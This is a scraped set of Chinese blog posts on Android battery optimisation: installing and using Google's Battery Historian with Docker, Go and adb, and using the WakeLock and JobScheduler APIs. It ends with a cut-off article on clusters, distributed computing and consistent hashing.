\nDocker只支持Windows10（mac貌似也支持）\n\n（3）Docker安装注意问题：翻墙\n\nA、进部署好的服务器docker，显示错误如下： \n{“UploadResponse”:[{“sdkVersion”:23,”historianV2Cs… \nhttps://github.com/google/battery-historian/issues/64 \n解决：You need a network connection.需要翻墙。 动脑的centos无法翻墙访问谷歌服务导致。\n\nB、进部署好的动脑服务器docker，没有显示错误，但是最上面提示了红色的颜色块，表示访问出错。 \n解决：无法翻墙访问谷歌服务导致。\n\n（4）操作命令\n\nGitbub上面是这样的命令及地址： \n\n\n\ndocker -- run -p <port>:9999 gcr.io/android-battery-historian:2.1 --port 9999\n\n这个里面的地址貌似不能用(可能是翻墙软件屏蔽了的原因)，然后找到了一个老外的镜像，是2.0版本的。（镜像地址：blystad/battery-historian或者bhaavan/battery-historian）\n\n关键：\n\n\n\ndocker -- run -p 6666:9999 blystad/battery-historian --port 9999\n\n或者命令如下(上面这种是临时开辟的程序服务，下面是开启了一个单独系统服务更正规的服务。)：\n\n\n\ndocker run -d –p 9999:9999 bhaavan/battery-historian \n\n\n\n\n3.3 导出手机的Bugreport日志\n\n输入指令 adb bugreport > bugreport.txt导出\n\n\n\n3.4 上传bugreport.txt文件至 http://localhost:9999", "time": "2018_08_14_11_12_49", "link": "https://blog.csdn.net/chenliguan/article/details/53454590", "title": "性能优化之电量优化2-使用Battery Historian生成电量消耗报告"}
{"timestamp": "2018_08_14_11_12_50", "desc": "电量消耗的计算与统计是一件麻烦而且矛盾的事情，记录电量消耗本身也是一个费电量的事情，随着Android开的性能要求越来越高，电量的优化，也显得格外重要，一个耗电的应用，用户肯定会毫不犹豫的进行卸载，所以本篇博客，我们一起来学习Android性能优化之电量优化。\n\n\n\n耗电是如何产生的？\n\n耗电情况，例如：打开屏幕，所有要使用CPU/GPU工作的动作都会唤醒屏幕，都会消耗电量。这和应用程序唤醒设备还不一样。 \n（1）唤醒屏幕 \n当用户电量屏幕的时候，意味着系统的各组件要开始进行工作，界面也需要开始执行渲染。\n\n待机状态的电量消耗： \n\n\n使用和唤醒屏幕后： \n\n\n当设备从休眠状态中，被应用程序唤醒时，就会产生一条电量使用高峰线。 \n当工作完成后，设备会主动进行休眠，这非常重要，在不使用或者很少使用的情况下，长时间保持屏幕唤醒会迅速消耗电池的电量。\n\n（2）蜂窝式无线 \n\n\n通过这张图，我们知道通过使用蜂窝无线时，会产生几个高峰： \n1.当设备通过无线网发送数据的时候，为了使用硬件，这里会出现一个唤醒好点高峰。 \n2.接下来还有一个高数值，这是发送数据包消耗的电量， \n3.然后接受数据包也会消耗大量电量 也看到一个峰值。 \n开启无线模式这个过程非常耗电，那么硬件这块为了防止频繁开启关闭耗电，采取了一个无奈的办法，会在一个小段时间内保持开启模式，防止短时间内还有数据包需要接收，也就是图中的Keep Awake的那一段。\n\n\n\n如何进行电量使用分析？\n\n（1）电量数据收集 \nAndroid 5.0及以上的设备, 允许我们通过adb命令dump出电量使用统计信息.\n\n1.因为电量统计数据是持续的, 统计我们的待测试App之前先reset下, 连上设备, 命令行执行:\n\n\n\n$ adb shell dumpsys batterystats --reset\nBattery stats reset.\n\n2.断开测试设备, 操作我们的待测试App. \n3.重新连接设备, 使用adb命令导出相关统计数据:\n\n\n\n// 此命令持续记录输出, 想要停止记录时按Ctrl+C退出.\n$ adb bugreport > bugreport.txt\n\n导出的统计数据存储到bugreport.txt, 此时我们可以借助如下工具来图形化展示电池的消耗情况.\n\n注意, 官方SDK文档导出文件方式为: \nadb shell dumpsys batterystats > batterystats.txt \n使用python historian.py batterystats.txt > batterystats.html查看数据 \n是battery-historian老版本的使用方式. 目前Battery Historian已更新2.0版本, 推荐使用bugreport方式导出数据分析, 可以看到更多信息.\n\n（2）电量分析工具Battery Historian \n工具开源地址： https://github.com/google/battery-historian  \n根据gitbub上面介绍，Battery History工具的安装有两种方式： \n1.通过安装Docker环境来安装。（需要翻墙） \nDocker只支持Windows10 \n\n\nGitbub上面是这样的命令及地址： \n\n\n\ndocker -- run -p <port>:9999 gcr.io/android-battery-historian:2.1 --port 9999\n\n2.通过编译gitbub上面的源码来安装。 \n(1)GO环境安装： \n1.下载 \n下载目录：https://golang.org/doc/install \nhttps://golang.org/doc/install?download=go1.7.3.windows-amd64.msi\n\n\n\n2.安装GO \n\n\n3.配置GOROOT和GOPATH \na. GOROOT的作用是告诉Go 命令和其他相关工具，在哪里去找到安装在你系统上的Go包,所以这里配置的是GO的安装目录 \n\n\nb.GOPATH可以简单理解为是工程的目录，所以创建一个GO的工程路径 \n \nC.最后配置一下环境变量，把Go的bin目录放到path环境变量中 \nD. 检查Go是否安装成功，打开命令行输入Go version \n\n\n(2)安装Git \n1.点击下载【下载】； （https://git-scm.com/ ） \n2.按照步骤安装； \n3.安装完成检查：命令行输入git version \n\n\n(3)安装Python \n1.点击下载【下载】，注意仅支持python2.7 （https://www.python.org/ ） \n2.安装完成； \n3.环境变量配置，添加Path的路径，是Python的安装路径\n\n4.输入命令行 python –V（注意是大写V）检查是否安装成功 \n\n\n(4)安装Java环境 \n1.点击下载【下载】； \n2.完成安装。\n\n(5)下载Battery Historian源码并且运行\n\n输入命令行go get -d -u github.com/google/battery-historian/...\n\n**下载到GOPATH配置目录下 \n1.进入到$GOPATH/src/github.com/google/battery-historian目录下方\n\n$ cd $GOPATH/src/github.com/google/battery-historian\n\n2.运行Battery Historian \n1） go run setup.go\n\n\n\n$ go run setup.go\n\n等待数分钟或者10分钟左右，如果仍然没有下载成功，可以手动下载，如下操作 \n**下载【closure-library】和【closure-compiler】和【flot-axislabels】，解压放到GOROOT目录下third_party文件夹下方的的closure-compiler和closure-library和flot-axislabels文件夹 ../battery-historian\\third_party；如果没有均手动创建\n\n2）go run cmd/battery-historian/battery-historian.go\n\n$ go run cmd/battery-historian/battery-historian.go [--port <default:9999>]\n\n\n\nbattery-historian使用\n\n数据准备 \nbattery-historian工具需要使用bugreport中的Battery History  \n1.先断开adb服务，然后开启adb服务 \nadb kill-server  这一步很重要，因为当我们开发时做电量记录时会打开很多可能造成冲突的东西。为了保险起见我们重启adb。 \nadb devices就会自动连接查找手机。当然也可以adb start-server\n\n2.重置电池数据收集 \n数据，我们在开始的时候需要通过以下命令来打开电池数据的获取以及重置：\n\nadb shell dumpsys batterystats --enable full-wake-history\nadb shell dumpsys batterystats --reset\n\n上面的操作相当于初始化操作，如果不这么做会有一大堆的干扰的数据，看起来会比较痛苦。然后把数据线直接拔掉(防止数据线造成充放电数据干扰)，现在做一些测试，手动或者跑一些自动化的case都行。经过一段时间后，我们重新连接手机确认adb连上了，运行下面这条命令来将bugreport的信息保存到txt文档中，\n\n\n\nadb bugreport > bugreport.txt\n\n或者用下面的命令也可以：\n\n\n\nadb shell dumpsys batterystats > batterystats.txt\nadb shell dumpsys batterystats > com.example.android.demo.app > batterystats.txt\n\n加上包名可以限制输出的数据是我们要检测的。 \n但是这个txt的数据可读性不强。接下来我们就要用到这个battery-historian工具了。\n\n分析数据 \n\n\n各个参数的意义 \n首先我们在bugreport.txt找到Battery History数据栏类似下面的信息：\n\n\n\n-------------------------------------------------------------------------------\n\nDUMP OF SERVICE batterystats:\n\nBattery History (2% used, 5980 used of 256KB, 45 strings using 2592):\n\n                    0 (9) RESET:TIME: 2015-03-05-15-21-56\n\n                    0 (2) 100 c0900422 status=discharging health=good plug=none temp=200 volt=4167 +running +wake_lock +sensor +screen data_conn=edge phone_signal_strength=great brightness=medium proc=u0a15:\"android.process.acore\"\n\n                    0 (2) 100 c0900422 proc=u0a7:\"com.android.cellbroadcastreceiver\"\n\n                    0 (2) 100 c0900422 proc=u0a53:\"com.android.gallery3d\"\n\n你在html中信息都能从bugreport.txt中找到相应的信息。  \n现在来分析各个指标代表的意义：\n\n横坐标\n\n \n上面的10，20代表的就是秒的意思，它是以一分钟为周期，到第60秒的时候变为0。横坐标就是一个时间范围，咱们的例子中统计的数据是以重置为起点，获取bugreport内容时刻为终点。我们一共采集了多长时间的数据，图表下也有信息说明。（经其他人的反馈，这个坐标间隔是会随着时间的长度发生改变，所以要以你的实际情况为准。这个缩放级别可以调整的，如下图：）\n\n\n\n纵坐标\n\n\n\n\n  数据项\n  含义\n\n\n\n  battery_level\n  电量，可以看出电量的变化\n\n\n  plugged\n  充电状态，这一栏显示是否进行了充电，以及充电的时间范围\n\n\n  screen\n  屏幕是否点亮，这一点可以考虑到睡眠状态和点亮状态下电量的使用信息\n\n\n  top\n  该栏显示当前时刻哪个app处于最上层，就是当前手机运行的app，用来判断某个app对手机电量的影响，这样也能判断出该app的耗电量信息。该栏记录了应用在某一个时刻启动，以及运行的时间，这对我们比对不同应用对性能的影响有很大的帮助\n\n\n  wake_lock\n  wake_lock 该属性是记录wake_lock模块的工作时间。是否有停止的时候等\n\n\n  running\n  界面的状态，主要判断是否处于idle的状态。用来判断无操作状态下电量的消耗\n\n\n  Job\n  后台的工作，比如服务service的运行\n\n\n  data_conn\n  数据连接方式的改变，上面的edge是说明采用的gprs的方式连接网络的。此数据可以看出手机是使用2g，3g，4g还是wifi进行数据交换的。这一栏可以看出不同的连接方式对电量使用的影响\n\n\n  status\n  电池状态信息，有充电，放电，未充电，已充满，未知等不同状态\n\n\n  phone_signal_strength\n  手机信号状态的改变。 这一栏记录手机信号的强弱变化图，依次来判断手机信号对电量的影响\n\n\n  health\n  电池健康状态的信息，这个信息一定程度上反映了这块电池使用了多长时间\n\n\n  plug\n  充电方式，usb或者插座，以及显示连接的时间\n\n\n  Sync\n  是否跟后台同步\n\n\n  phone_in_call\n  是否进行通话\n\n\n  gps\n  gps是否开启\n\n\n\n\n\n\n进行电量优化\n\nTrack Battery Status & Battery Manager \n我们可以通过下面的代码来获取手机的当前充电状态：\n\n\n\n// It is very easy to subscribe to changes to the battery state, but you can get the current \n// state by simply passing null in as your receiver. Nifty, isn't that? \nIntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);\nIntent batteryStatus = this.registerReceiver(null, filter); \nint chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1); \nboolean acCharge = (chargePlug == BatteryManager.BATTERY_PLUGGED_AC); \nif (acCharge) {\n Log.v(LOG_TAG,“The phone is charging!”); \n }\n\n在上面的例子演示了如何立即获取到手机的充电状态，得到充电状态信息之后，我们可以有针对性的对部分代码做优化。比如我们可以判断只有当前手机为AC充电状态时 才去执行一些非常耗电的操作。\n\n\n\n/** * This method checks for power by comparing the current battery state against all possible * plugged in states. In this case, a device may be considered plugged in either by USB, AC, or * wireless charge. (Wireless charge was introduced in API Level 17.) */\n private boolean checkForPower() { \nIntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED); Intent batteryStatus = this.registerReceiver(null, filter);\n // There are currently three ways a device can be plugged in. We should check them all. \nboolean usbCharge = (chargePlug == BatteryManager.BATTERY_PLUGGED_USB); \nboolean acCharge = (chargePlug == BatteryManager.BATTERY_PLUGGED_AC); \nboolean wirelessCharge = false; \nif (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) \n{ wirelessCharge = (chargePlug ==   BatteryManager.BATTERY_PLUGGED_WIRELESS); \n} \nreturn (usbCharge || acCharge || wirelessCharge);\n }\n\n屏幕唤醒 \n有些时候我们需要改变Android系统默认的这种状态：比如玩游戏时我们需要保持屏幕常亮，比如一些下载操作不需要屏幕常亮但需要CPU一直运行直到任务完成。 \n最好的方式是在Activity中使用FLAG_KEEP_SCREEN_ON 的Flag。\n\n\n\n getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);\n\n另一个方式是在布局文件中使用android:keepScreenOn属性：\n\n\n\n<RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    android:keepScreenOn=\"true\">\n    ...\n</RelativeLayout>\n\nandroid:keepScreenOn = ” true “的作用和FLAG_KEEP_SCREEN_ON一样。使用代码的好处是你允许你在需要的地方关闭屏幕。\n\n注意：一般不需要人为的去掉FLAG_KEEP_SCREEN_ON的flag，windowManager会管理好程序进入后台回到前台的的操作。如果确实需要手动清掉常亮的flag，使用getWindow().clearFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)\n\nWakelock and Battery Drain \n假设你的手机里面装了大量的社交类应用，即使手机处于待机状态，也会经常被这些应用唤醒用来检查同步新的数据信息。一个最简单的唤醒手机的方法是使用PowerManager.WakeLock的API来保持CPU工作并防止屏幕变暗关闭。这使得手机可以被唤醒，执行工作，然后回到睡眠状态。知道如何获取WakeLock是简单的，可是及时释放WakeLock也是非常重要的，不恰当的使用WakeLock会导致严重错误。例如网络请求的数据返回时间不确定，导致本来只需要10s的事情一直等待了1个小时，这样会使得电量白白浪费了。这也是为何使用带超时参数的wakelock.acquice()方法是很关键的。\n\nwake_lock锁主要是相对系统的休眠而言的，意思就是我的程序给CPU加了这个锁那系统就不会休眠了，这样做的目的是为了全力配合我们程序的运行。有的情况如果不这么做就会出现一些问题，比如微信等及时通讯的心跳包会在熄屏不久后停止网络访问等问题。所以微信里面是有大量使用到了wake_lock锁。\n\nwake_lock:两种锁，一种计数锁；非计数锁(锁了很多次，只需要release一次就可以解除了)\n\n唤醒锁可划分为并识别四种用户唤醒锁：\n\n\n\n\n  标记值\n  CPU\n  屏幕\n  键盘\n\n\n\n  PARTIAL_WAKE_LOCK\n  开启\n  关闭\n  关闭\n\n\n  标记值\n  开启\n  变暗\n  关闭\n\n\n  标记值\n  开启\n  变亮\n  关闭\n\n\n  标记值\n  开启\n  变亮\n  变亮\n\n\n\n\n自 API 等级 17 开始，FULL_WAKE_LOCK 被弃用。 改为使用 FLAG_KEEP_SCREEN_ON。 \n添加唤醒锁权限：\n\n\n\n<uses-permission android:name=\"android.permission.WAKE_LOCK\" />\n\n直接使用唤醒锁：\n\n\n\nPowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);\nWakeLock wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,\"MyWakelockTag\");\nwakeLock.acquire();\n\n注意：在使用该类的时候，必须保证acquire和release是成对出现的。不然当我们业务已经不需要时，当CPU处于唤醒状态，这个时候就会损耗多余的电量。\n\n但是仅仅设置超时并不足够解决问题，例如设置多长的超时比较合适？什么时候进行重试等等？解决上面的问题，正确的方式可能是使用非精准定时器。通常情况下，我们会设定一个时间进行某个操作，但是动态修改这个时间也许会更好。例如，如果有另外一个程序需要比你设定的时间晚5分钟唤醒，最好能够等到那个时候，两个任务捆绑一起同时进行，这就是非精确定时器的核心工作原理。我们可以定制计划的任务，可是系统如果检测到一个更好的时间，它可以推迟你的任务，以节省电量消耗。\n\nJobScheduler \nJobSchedule的宗旨就是把一些不是特别紧急的任务放到更合适的时机批量处理。\n\n自定义一个Service类，继承自JobService\n\npublic class JobSchedulerService extends JobService{\n    private String TAG = JobSchedulerService.class.getSimpleName();\n\n    @Override\n    public boolean onStartJob(JobParameters jobParameters) {\n        Log.d(TAG, \"onStartJob:\" + jobParameters.getJobId());\n\n        if(true) {\n            // JobService在主线程运行，如果我们这里需要处理比较耗时的业务逻辑需单独开启一条子线程来处理并返回true，\n            // 当给定的任务完成时通过调用jobFinished(JobParameters params, boolean needsRescheduled)告知系统。\n\n            //假设开启一个线程去下载文件\n            new DownloadTask().execute(jobParameters);\n\n            return true;\n\n        }else {\n            //如果只是在本方法内执行一些简单的逻辑话返回false就可以了\n            return false;\n        }\n    }\n\n    /**\n     * 比如我们的服务设定的约束条件为在WIFI状态下运行，结果在任务运行的过程中WIFI断开了系统\n     * 就会通过回掉onStopJob()来通知我们停止运行，正常的情况下不会回掉此方法\n     *\n     * @param jobParameters\n     * @return\n     */\n    @Override\n    public boolean onStopJob(JobParameters jobParameters) {\n        Log.d(TAG, \"onStopJob:\" + jobParameters.getJobId());\n\n        //如果需要服务在设定的约定条件再次满足时再次执行服务请返回true，反之false\n        return true;\n    }\n\n    class DownloadTask extends AsyncTask<JobParameters, Object, Object> {\n        JobParameters mJobParameters;\n\n        @Override\n        protected Object doInBackground(JobParameters... jobParameterses) {\n            mJobParameters = jobParameterses[0];\n\n            //比如说我们这里处理一个下载任务\n            //或是处理一些比较复杂的运算逻辑\n            //...\n\n            try {\n                Thread.sleep(30*1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            return null;\n        }\n\n        @Override\n        protected void onPostExecute(Object o) {\n            super.onPostExecute(o);\n            //如果在onStartJob()中返回true的话,处理完成逻辑后一定要执行jobFinished()告知系统已完成，\n            //如果需要重新安排服务请true，反之false\n            jobFinished(mJobParameters, false);\n        }\n    }\n}\n\n记得在Manifest文件内配置Service\n\n\n\n<service android:name=\".JobSchedulerService\" android:permission=\"android.permission.BIND_JOB_SERVICE\"/>\n\n创建工作计划\n\n\n\npublic class MainActivity extends Activity{\n    private JobScheduler mJobScheduler;\n    private final int JOB_ID = 1;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.mai_layout);\n\n        mJobScheduler = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE );\n\n        //通过JobInfo.Builder来设定触发服务的约束条件，最少设定一个条件\n        JobInfo.Builder jobBuilder = new JobInfo.Builder(JOB_ID, new ComponentName(this, JobSchedulerService.class));\n\n        //循环触发，设置任务每三秒定期运行一次\n        jobBuilder.setPeriodic(3000);\n\n        //单次定时触发，设置为三秒以后去触发。这是与setPeriodic(long time)不兼容的，\n        // 并且如果同时使用这两个函数将会导致抛出异常。\n        jobBuilder.setMinimumLatency(3000);\n\n        //在约定的时间内设置的条件都没有被触发时三秒以后开始触发。类似于setMinimumLatency(long time)，\n        // 这个函数是与 setPeriodic(long time) 互相排斥的，并且如果同时使用这两个函数，将会导致抛出异常。\n        jobBuilder.setOverrideDeadline(3000);\n\n        //在设备重新启动后设置的触发条件是否还有效\n        jobBuilder.setPersisted(false);\n\n        // 只有在设备处于一种特定的网络状态时，它才触发。\n        // JobInfo.NETWORK_TYPE_NONE,无论是否有网络均可触发，这个是默认值；\n        // JobInfo.NETWORK_TYPE_ANY，有网络连接时就触发；\n        // JobInfo.NETWORK_TYPE_UNMETERED，非蜂窝网络中触发；\n        // JobInfo.NETWORK_TYPE_NOT_ROAMING，非漫游网络时才可触发；\n        jobBuilder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_UNMETERED);\n\n        //设置手机充电状态下触发\n        jobBuilder.setRequiresCharging(true);\n\n        //设置手机处于空闲状态时触发\n        jobBuilder.setRequiresDeviceIdle(true);\n\n        //得到JobInfo对象\n        JobInfo jobInfo = jobBuilder.build();\n\n        //设置开始安排任务，它将返回一个状态码\n        //JobScheduler.RESULT_SUCCESS，成功\n        //JobScheduler.RESULT_FAILURE，失败\n        if (mJobScheduler.schedule(jobInfo) == JobScheduler.RESULT_FAILURE) {\n            //安排任务失败\n        }\n\n        //停止指定JobId的工作服务\n        mJobScheduler.cancel(JOB_ID);\n        //停止全部的工作服务\n        mJobScheduler.cancelAll();\n    }", "time": "2018_08_14_11_12_50", "link": "https://blog.csdn.net/u012124438/article/details/74617649", "title": "Android性能优化系列之电量优化"}
{"timestamp": "2018_08_14_11_12_52", "desc": "安装 项目主页\n\n\n\n方法一 使用dock容器 (推荐该方法)\n\n\n下载安装dock 官网\n部署 Battery Historian\n\n\n\n\ndocker run -p 9999:9999 gcr.io/android-battery-historian/stable:3.0 --port 9999\n\n\n后面再次运行的时候就不需要再部署了，只需要在docker里直接运行即可\n\n\n\n\n❯ docker ps -a\nCONTAINER ID        IMAGE                                         COMMAND                  CREATED             STATUS                      PORTS               NAMES\nd8ae0c9c924c        gcr.io/android-battery-historian/stable:3.0   \"battery-historian...\"   3 hours ago         Exited (2) 17 seconds ago                       heuristic_lamarr\n❯ docker start d8ae0c9c924c\nd8ae0c9c924c\n❯ docker stop d8ae0c9c924c\nd8ae0c9c924c\n❯ docker logs -f d8ae0c9c924c\n\n\n\n方法二 使用go、python、git\n\n\n下载安装golong\n配置环境变量到/etc/profile文件里\n\n\n\n\nexport GOPATH=$HOME/work\nexport GOBIN=$GOPATH/bin\nexport PATH=$PATH:$GOBIN\n\n\n拉取项目\n\n\n\n\ngo get -d -u github.com/google/battery-historian/...\n\n\n拉取成功后运行 Battery Historian\n\n\n\n\n$ cd $GOPATH/src/github.com/google/battery-historian\n\n# Compile Javascript files using the Closure compiler\n$ go run setup.go\n\n# Run Historian on your machine (make sure $PATH contains $GOBIN)\n$ go run cmd/battery-historian/battery-historian.go [--port <default:9999>]\n\n\n\n抓取手机信息\n\n\nTo obtain a bug report from your development device running Android 7.0 and higher:\n\n\n\n\n$ adb shell dumpsys batterystats --enable full-wake-history\n$ adb shell dumpsys batterystats --reset\n$ adb bugreport bugreport.zip\n\n\nFor devices 6.0 and lower:\n\n\n\n\n$ adb bugreport > bugreport.txt\n\n\n\n查看分析结果\n\n\n打开 http://localhost:9999\n选择上面生成的文件并进行分析", "time": "2018_08_14_11_12_52", "link": "https://blog.csdn.net/chunlongyuan/article/details/79258408", "title": "battery historian"}
{"timestamp": "2018_08_14_11_12_52", "desc": "222013-10简单说，分布式是以缩短单个任务的执行时间来提升效率的，而集群则是通过提高单位时间内执行的任务数来提升效率。 \n例如： \n如果一个任务由10个子任务组成，每个子任务单独执行需1小时，则在一台服务器上执行改任务需10小时。 \n采用分布式方案，提供10台服务器，每台服务器只负责处理一个子任务，不考虑子任务间的依赖关系，执行完这个任务只需一个小时。(这种工作模式的一个典型代表就是Hadoop的Map/Reduce分布式计算模型） \n而采用集群方案，同样提供10台服务器，每台服务器都能独立处理这个任务。假设有10个任务同时到达，10个服务器将同时工作，10小后，10个任务同时完成，这样，整身来看，还是1小时内完成一个任务！ \n以下是摘抄自网络文章： \n集群概念 \n1. 两大关键特性 \n集群是一组协同工作的服务实体，用以提供比单一服务实体更具扩展性与可用性的服务平台。在客户端看来，一个集群就象是一个服务实体，但事实上集群由一组服务实体组成。与单一服务实体相比较，集群提供了以下两个关键特性： \n·  可扩展性－－集群的性能不限于单一的服务实体，新的服务实体可以动态地加入到集群，从而增强集群的性能。 \n·  高可用性－－集群通过服务实体冗余使客户端免于轻易遇到out of service的警告。在集群中，同样的服务可以由多个服务实体提供。如果一个服务实体失败了，另一个服务实体会接管失败的服务实体。集群提供的从一个出 错的服务实体恢复到另一个服务实体的功能增强了应用的可用性。 \n2. 两大能力 \n为了具有可扩展性和高可用性特点，集群的必须具备以下两大能力： \n·  负载均衡－－负载均衡能把任务比较均衡地分布到集群环境下的计算和网络资源。 \n·  错误恢复－－由于某种原因，执行某个任务的资源出现故障，另一服务实体中执行同一任务的资源接着完成任务。这种由于一个实体中的资源不能工作，另一个实体中的资源透明的继续完成任务的过程叫错误恢复。 \n负载均衡和错误恢复都要求各服务实体中有执行同一任务的资源存在，而且对于同一任务的各个资源来说，执行任务所需的信息视图（信息上下文）必须是一样的。 \n3. 两大技术 \n实现集群务必要有以下两大技术： \n·  集群地址－－集群由多个服务实体组成，集群客户端通过访问集群的集群地址获取集群内部各服务实体的功能。具有单一集群地址（也叫单一影像）是集群的一个基 本特征。维护集群地址的设置被称为负载均衡器。负载均衡器内部负责管理各个服务实体的加入和退出，外部负责集群地址向内部服务实体地址的转换。有的负载均 衡器实现真正的负载均衡算法，有的只支持任务的转换。只实现任务转换的负载均衡器适用于支持ACTIVE-STANDBY的集群环境，在那里，集群中只有 一个服务实体工作，当正在工作的服务实体发生故障时，负载均衡器把后来的任务转向另外一个服务实体。 \n·  内部通信－－为了能协同工作、实现负载均衡和错误恢复，集群各实体间必须时常通信，比如负载均衡器对服务实体心跳测试信息、服务实体间任务执行上下文信息的通信。 \n具有同一个集群地址使得客户端能访问集群提供的计算服务，一个集群地址下隐藏了各个服务实体的内部地址，使得客户要求的计算服务能在各个服务实体之间分布。内部通信是集群能正常运转的基础，它使得集群具有均衡负载和错误恢复的能力。 \n集群分类 \nLinux集群主要分成三大类( 高可用集群， 负载均衡集群，科学计算集群) \n高可用集群( High Availability Cluster) \n负载均衡集群(Load Balance Cluster)\n\n\n\n科学计算集群(High Performance Computing Cluster)\n\n具体包括： \nLinux High Availability 高可用集群 \n(普通两节点双机热备，多节点HA集群，RAC, shared, share-nothing集群等) \nLinux Load Balance 负载均衡集群 \n(LVS等….) \nLinux High Performance Computing 高性能科学计算集群 \n(Beowulf 类集群….) \n分布式存储 \n其他类linux集群 \n(如Openmosix, rendering farm 等..) \n详细介绍 \n1. 高可用集群(High Availability Cluster) \n常见的就是2个节点做成的HA集群，有很多通俗的不科学的名称，比如”双机热备”, “双机互备”, “双机”. \n高可用集群解决的是保障用户的应用程序持续对外提供服务的能力。 (请注意高可用集群既不是用来保护业务数据的，保护的是用户的业务程序对外不间断提供服务，把因软件/硬件/人为造成的故障对业务的影响降低到最小程度)。 \n2. 负载均衡集群(Load Balance Cluster) \n负载均衡系统：集群中所有的节点都处于活动状态，它们分摊系统的工作负载。一般Web服务器集群、数据库集群和应用服务器集群都属于这种类型。 \n负载均衡集群一般用于相应网络请求的网页服务器，数据库服务器。这种集群可以在接到请求时，检查接受请求较少，不繁忙的服务器，并把请求转到这些服务器上。从检查其他服务器状态这一点上看，负载均衡和容错集群很接近，不同之处是数量上更多。 \n3. 科学计算集群(High Performance Computing Cluster) \n高性能计算(High Perfermance Computing)集群，简称HPC集群。这类集群致力于提供单个计算机所不能提供的强大的计算能力。 \n高性能计算分类 \n高吞吐计算(High-throughput Computing) \n有一类高性能计算，可以把它分成若干可以并行的子任务，而且各个子任务彼此间没有什么关联。象在家搜寻外星人（   – Search for Extraterrestrial Intelligence at Home ）就是这一类型应用。这一项目是利用Internet上的闲置的计算资源来搜寻外星人。SETI项目的服务器将一组数据和数据模式发给Internet上 参加SETI的计算节点，计算节点在给定的数据上用给定的模式进行搜索，然后将搜索的结果发给服务器。服务器负责将从各个计算节点返回的数据汇集成完整的 数据。因为这种类型应用的一个共同特征是在海量数据上搜索某些模式，所以把这类计算称为高吞吐计算。所谓的Internet计算都属于这一类。按照 Flynn的分类，高吞吐计算属于SIMD（Single Instruction/Multiple Data）的范畴。 \n分布计算(Distributed Computing) \n另一类计算刚好和高吞吐计算相反，它们虽然可以给分成若干并行的子任务，但是子任务间联系很紧密，需要大量的数据交换。按照Flynn的分类，分布式的高性能计算属于MIMD（Multiple Instruction/Multiple Data）的范畴。 \n4. 分布式（集群）与集群的联系与区别 \n分布式是指将不同的业务分布在不同的地方。 \n而集群指的是将几台服务器集中在一起，实现同一业务。 \n分布式中的每一个节点，都可以做集群。 \n而集群并不一定就是分布式的。 \n举例：就比如新浪网，访问的人多了，他可以做一个群集，前面放一个响应服务器，后面几台服务器完成同一业务，如果有业务访问的时候，响应服务器看哪台服务器的负载不是很重，就将给哪一台去完成。 \n而分布式，从窄意上理解，也跟集群差不多， 但是它的组织比较松散，不像集群，有一个组织性，一台服务器垮了，其它的服务器可以顶上来。 \n分布式的每一个节点，都完成不同的业务，一个节点垮了，哪这个业务就不可访问了。 \n发布于 2个月前， 阅读(16) | 评论(0) | 投票(0) | 收藏(0) \n转 \n分类: \n162013-10 \n互联网创业中大部分人都是草根创业，这个时候没有强劲的服务器，也没有钱去买很昂贵的海量数据库。在这样严峻的条件下，一批又一批的创业者从创业中获得成功，这个和当前的开源技术、海量数据架构有着必不可分的关系。比如我们使用mysql、nginx等开源软件，通过架构和低成本服务器也可以搭建千万级用户访问量的系统。新浪微博、淘宝网、腾讯等大型互联网公司都使用了很多开源免费系统搭建了他们的平台。所以，用什么没关系，只要能够在合理的情况下采用合理的解决方案。 \n那怎么搭建一个好的系统架构呢？这个话题太大，这里主要说一下数据分流的方式。比如我们的数据库服务器只能存储200个数据，突然要搞一个活动预估达到600个数据。 \n可以采用两种方式：横向扩展或者纵向扩展。 \n纵向扩展是升级服务器的硬件资源。但是随着机器的性能配置越高，价格越高，这个代价对于一般的小公司是承担不起的。 \n横向扩展是采用多个廉价的机器提供服务。这样一个机器只能处理200个数据、3个机器就可以处理600个数据了，如果以后业务量增加还可以快速配置增加。在大多数情况都选择横向扩展的方式。如下图： \n现在有个问题了，这600个数据如何路由到对应的机器。需要考虑如果均衡分配，假设我们600个数据都是统一的自增id数据，从1~600，分成3堆可以采用 id mod 3的方式。其实在真实环境可能不是这种id是字符串。需要把字符串转变为hashcode再进行取模。 \n目前看起来是不是解决我们的问题了，所有数据都很好的分发并且没有达到系统的负载。但如果我们的数据需要存储、需要读取就没有这么容易了。业务增多怎么办，大家按照上面的横向扩展知道需要增加一台服务器。但是就是因为增加这一台服务器带来了一些问题。看下面这个例子，一共9个数，需要放到2台机器（1、2）上。各个机器存放为：1号机器存放1、3、5、7、9 ，2号机器存放 2、4、6、8。如果扩展一台机器3如何，数据就要发生大迁移，1号机器存放1、4、7, 2号机器存放2、5、8, 3号机器存放3、6、9。如图： \n从图中可以看出 1号机器的3、5、9迁移出去了、2好机器的4、6迁移出去了，按照新的秩序再重新分配了一遍。数据量小的话重新分配一遍代价并不大，但如果我们拥有上亿、上T级的数据这个操作成本是相当的高，少则几个小时多则数天。并且迁移的时候原数据库机器负载比较高，那大家就有疑问了，是不是这种水平扩展的架构方式不太合理？ \n—————————–华丽分割线————————————— \n一致性hash就是在这种应用背景提出来的，现在被广泛应用于分布式缓存，比如memcached。下面简单介绍下一致性hash的基本原理。最早的版本 http://dl.acm.org/citation.cfm?id=258660。国内网上有很多文章都写的比较好。如： http://blog.csdn.net/x15594/article/details/6270242 \n下面简单举个例子来说明一致性hash。 \n准备：1、2、3 三台机器 \n还有待分配的9个数 1、2、3、4、5、6、7、8、9 \n一致性hash算法架构 \n步骤 \n一、构造出来 2的32次方 